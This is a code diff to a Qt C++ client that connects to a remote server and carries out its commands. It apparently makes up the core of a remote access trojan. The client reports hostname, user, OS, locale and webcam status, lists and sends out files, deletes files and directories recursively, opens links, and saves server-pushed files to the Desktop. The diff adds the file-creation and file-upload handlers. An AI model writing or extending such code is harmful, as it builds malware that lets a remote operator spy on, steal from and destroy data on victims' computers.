@@ -27,8 +27,9 @@ void MainWindow::ClientStartup()
 
         QObject::connect(socket,&QTcpSocket::readyRead,this,[&](){
             qDebug() << "[+] New message from the server.";
+            QByteArray data;
+            data += socket->readAll();
 
-            QByteArray data = socket->readAll();
 
             if(data == "#getPcInformation")
             {
@@ -48,8 +49,9 @@ void MainWindow::ClientStartup()
                     camAnsw = "No";
                 }
 
-                QByteArray Data = "#getPcInformation:" + QSysInfo::machineHostName().toLatin1() + ":" + QDir::home().dirName().toLatin1() + ":" + "N/A" + ":" + QSysInfo::prettyProductName().toLatin1() + ":" + language.toLatin1() + ":" + country.toLatin1() + ":" + camAnsw.toLatin1();
+                QByteArray Data = "#getPcInformation:" + QSysInfo::machineHostName().toUtf8() + ":" + QDir::home().dirName().toUtf8() + ":" + "N/A" + ":" + QSysInfo::prettyProductName().toUtf8() + ":" + language.toUtf8() + ":" + country.toUtf8() + ":" + camAnsw.toUtf8();
                 socket->write(Data);
+                data.clear();
             }
 
             if(data.startsWith("#getFileTree:"))
@@ -62,9 +64,10 @@ void MainWindow::ClientStartup()
                     SelectedPath.push_back(file.fileName() + "\n");
                 }
 
-                socket->write("#getFileTree:" + SelectedPath.toLatin1());
+                socket->write("#getFileTree:" + SelectedPath.toUtf8());
                 socket->waitForBytesWritten();
                 SelectedPath.clear();
+                data.clear();
             }
             if(data.startsWith("#getAllFolders:"))
             {
@@ -81,24 +84,31 @@ void MainWindow::ClientStartup()
                 }
 
                 // Отправляем данные на сервер
-                socket->write("#getAllFolders:" + files.toLatin1());
+                socket->write("#getAllFolders:" + files.toUtf8());
                 socket->waitForBytesWritten();
+                data.clear();
 
             }
             if(data.startsWith("#deleteFile:"))
             {
                 QString deletePath = data.mid(12);
                 QFile::remove(deletePath);
+                data.clear();
             }
             if(data.startsWith("#deleteDir:"))
             {
                 QString deleteDir = data.mid(11);
                 QDir dir(deleteDir);
                 dir.removeRecursively();
+                data.clear();
             }
             if(data.startsWith("#createFile:"))
             {
-
+                QString filePath = data.mid(12);
+                QFile createFile(filePath);
+                createFile.open(QIODevice::WriteOnly);
+                createFile.close();
+                data.clear();
             }
             if(data.startsWith("#copyFiles:"))
             {
@@ -115,11 +125,44 @@ void MainWindow::ClientStartup()
 
                 socket->write(buffer);
                 socket->waitForBytesWritten();
+                data.clear();
             }
             if(data.startsWith("#openLink:"))
             {
                 QString link = data.mid(10);
                 QDesktopServices::openUrl(QUrl(link));
+                data.clear();
+            }
+            if(data.startsWith("#inputFile:"))
+            {
+                if(isTimerCreated == 0)
+                {
+                    qDebug() << 123;
+                    isTimerCreated = 1;
+                    QTimer::singleShot(5000,this,[&](){
+                        QString bufferData = QString(data.first(20));
+                        qDebug() << bufferData;
+                        bufferData = bufferData.mid(11);
+                        QStringList splitData = bufferData.split(":");
+                        qint16 size = splitData[0].size();
+                        qDebug() << 123;
+                        QByteArray file = data.mid(11+size+1);
+                        qDebug() << 123;
+                        QString filSavePath = QDir::homePath() + "/Desktop/" + "sendedFile" + splitData[0];
+                        QFile saveFile(filSavePath);
+                        qDebug() << 123;
+                        saveFile.open(QIODevice::WriteOnly);
+                        saveFile.write(file);
+                        saveFile.close();
+                        data.clear();
+                        isTimerCreated = 0;
+                    });
+
+                }
+                else if(isTimerCreated == 1)
+                {
+
+                }
             }
         });
 
